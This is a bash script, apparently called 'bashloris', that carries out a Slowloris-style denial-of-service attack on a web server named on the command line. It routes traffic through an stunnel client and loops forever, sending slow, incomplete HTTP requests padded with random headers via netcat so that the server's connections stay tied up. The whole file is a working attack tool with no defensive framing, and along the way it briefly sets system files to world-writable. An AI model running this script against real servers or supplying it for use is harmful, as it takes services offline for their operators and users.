ARG3=${3:-5}
if [ -z "$3" ]
then 
echo "no interval value supplied, setting it to five (5) seconds."
elif ! [[ "$3" =~ ^[0-9]+$ ]]; 
then
echo "Interval must be an integer (number).  Setting to '5'!"
ARG3=5
fi
LHOST=127.0.0.1
LPORT=6661
TARGET=$1
PORT=$2
echo "Target Server is $TARGET:$PORT" && sleep 1;
#ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Adding bashloris stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "bashloris-stunnel-client 9991/tcp #bashloris stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
#create stunnel configuration
	echo "Creating stunnel client on $LHOST:$LPORT"
		sudo pkill stunnel &&
		sudo rm -f /etc/stunnel/bashloris.conf &&
		sudo touch /etc/stunnel/bashloris.conf && 
		sudo chmod 777 /etc/stunnel/bashloris.conf
		sudo echo "[BASHLORIS-CLIENT]" >> /etc/stunnel/bashloris.conf
		sudo echo "client=yes" >> /etc/stunnel/bashloris.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/bashloris.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/bashloris.conf
		sudo echo "verify=0" >> /etc/stunnel/bashloris.conf
		sudo chmod 644 /etc/stunnel/bashloris.conf
		sudo stunnel /etc/stunnel/bashloris.conf && echo "Created stunnel configuration!"

echo "Launching attack.....Use 'Ctrl c' to stop...."
while true; do
LONGSTRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
SHORTSTRING=$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6)
echo -e "GET / HTTP/1.1\r\nHost: $1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$SHORTSTRING: $LONGSTRING\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n"|netcat -i $ARG3 -w 30000 $LHOST $LPORT 2 >/dev/null; done
if [ $? -ne 0 ]
then
	echo "Usage:"
	echo "    bashloris <target> <port> <interval> = Launch bashloris against specified target."
	echo "    Interval is optional and defaults to five (5) seconds."
	echo "    Interval defines the time in seconds between sending each header."
fi
